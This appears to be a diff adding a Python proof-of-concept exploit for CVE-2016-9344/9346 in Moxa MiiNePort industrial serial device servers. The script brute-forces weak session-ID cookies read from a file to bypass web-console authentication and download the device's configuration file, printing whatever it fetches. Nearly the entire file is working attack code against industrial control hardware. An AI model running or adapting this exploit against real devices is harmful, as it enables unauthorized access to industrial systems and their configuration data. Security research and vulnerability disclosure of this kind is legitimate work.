@@ -1,0 +1,153 @@
+# !/usr/bin/python
+# By:Aditya K Sood - SecNiche Security Labs ! (c) 2016
+
+##############################################################################
+# 
+# Assigned CVEs: CVE-2016-9344 | CVE-2016-9346
+# ICS-CERT Advisory: https://ics-cert.us-cert.gov/advisories/ICSA-16-343-01
+# 
+# Vulnerable Version:
+#	MiiNePort E1 versions prior to 1.8,
+#	MiiNePort E2 versions prior to 1.4, and
+#	MiiNePort E3 versions prior to 1.1						
+##############################################################################
+
+import re
+import os.path
+import urllib2
+import base64
+import gzip
+import zlib
+import sys
+from StringIO import StringIO
+from io import BytesIO
+import requests
+from Queue import Queue
+from threading import Thread
+
+class bcolors:
+	HEADER = '\033[95m'
+	OKBLUE = '\033[94m'
+	OKGREEN = '\033[92m'
+	WARNING = '\033[93m'
+	FAIL = '\033[91m'
+	ENDC = '\033[0m'
+	BOLD = '\033[1m'
+	UNDERLINE = '\033[4m'
+
+def banner():
+	tool_banner = """
+	     _   .-')               ) (`-.       ('-.     
+	   ( '.( OO )_              ( OO ).    ( OO ).-. 
+	   ,--.   ,--.).-'),-----.(_/.  \_)-. / . --. / 
+	   |   `.'   |( OO'  .-.  '\  `.'  /  | \-.  \  
+	   |         |/   |  | |  | \     /\.-'-'  |  | 
+	   |  |'.'|  |\_) |  |\|  |  \   \ | \| |_.'  | 
+	   |  |   |  |  \ |  | |  | .'    \_) |  .-.  | 
+	   |  |   |  |   `'  '-'  '/  .'.  \  |  | |  | 
+	   `--'   `--'     `-----''--'   '--' `--' `--' 
+	"""
+	print bcolors.BOLD + tool_banner + bcolors.ENDC
+	description()
+
+def description():
+	
+	print "---------------------------------------------------------------------------------------------"
+	tool_desc = """
+	About This Tool: Proof-of-concept designed against Moxa web console - weak session-id generation.
+	Purpose: The tool is designed to assist penetration testers and researchers.
+	
+	Vulnerability Researched by: Aditya K Sood, Independent Security Researcher.
+	Powered by: SecNiche Security Labs - http://www.secniche.org
+	Note: Use it at your own risk  -:)
+	"""
+	print tool_desc
+	print "-----------------------------------------------------------------------------------------------"
+	
+def trigger_requests(ip, target_resource, cookie_id):
+	try:
+		# Create request to URLi
+		url = "http://"+str(ip)+ "/"+str(target_resource)
+		print "\n[*] target url : %s" %str(url)
+
+		referer = "http://"+str(ip)+"/moxa/home.htm"
+		print "[*] source HTTP referer : %s" %referer
+
+		print "[*] targeting IP= (%s) using pre-generated cookie identifier= (%s)" %(ip,cookie_id)
+		req = requests.get(str(url), allow_redirects=False, headers = {'Accept-Language' : 'en-US,en;q=0.8', 
+							'Accept-Encoding' : 'gzip, deflate, sdch',
+							'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
+							'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36' ,
+							'Referer':str(referer), 
+							'Cookie': 'ChallID='+ str(cookie_id),
+							'Connection' : 'keep-alive'})
+
+		print req
+		if req.status_code == 200:
+			print "\n-------------- Fetched Module Info from Switch --------------"
+			print bcolors.FAIL + req.text + bcolors.ENDC
+			print "--------------------------------------------------------------\n"
+		else:
+			"[-] cookie_id used | http error occured : (%s | %s)" %(cookie_id , req.status_code)
+
+	except urllib2.URLError, e:
+		if not hasattr(e, "code"):
+			return False
+		raise
+		sys.exit(0)
+
+	except urllib2.HTTPError as e:
+		print "[-] http error occurred : %s" %e.code
+		sys.exit(0)
+	except:
+		return False
+
+	return True
+
+
+
+def main():
+	try:
+		ip_address = str(sys.argv[1])
+		module  = str(sys.argv[2])
+		filename = str(sys.argv[3])
+		moxa_web = {	'moxa_config':   'moxa/Config.txt'}
+
+		banner()
+		print "[*] moxa web console - weak session id bruteforcing and auth bypass tool!"
+		print "[*] vulnerability researched by: Aditya K Sood!\n"
+
+		cookie_id_list = []
+		file_handle = open(filename, "rw")
+		for item in file_handle:
+			cookie_id_list.append(item.strip());
+
+
+		if module in moxa_web.keys():
+			for cookie_identifier in cookie_id_list:
+			#	print "using cookie (session) identifier : (%s)" %cookie_identifier
+			# print "[*] module (%s) exists, fetching information without authentication from switch at : %s" %(module, ip_address)
+				trigger_requests(ip_address,str(moxa_web[module]), cookie_identifier)
+			
+		else:
+			print "[-] module (%s) is not supported, check the support modules!" %module 
+
+	except IndexError:
+		description()
+		print "[-] usage: %s <switch_ip_address> <module name> <file_with_pre_generated_4digit_ids>" %str(sys.argv[0])
+		print "[*] example: %s 1.1.1.1  moxa_config cookie_ids.txt \n" %str(sys.argv[0])
+		
+		print "[*] <modules name>:" 
+		print "	moxa_config_file_download : extract moxa web console configuration file!"
+		
+
+		print "\n"	
+		sys.exit(0)
+
+	except (TypeError, ValueError):
+		raise
+		print "[-] type error occurred\n"
+		sys.exit(0)
+
+if __name__ =="__main__":
+	main()
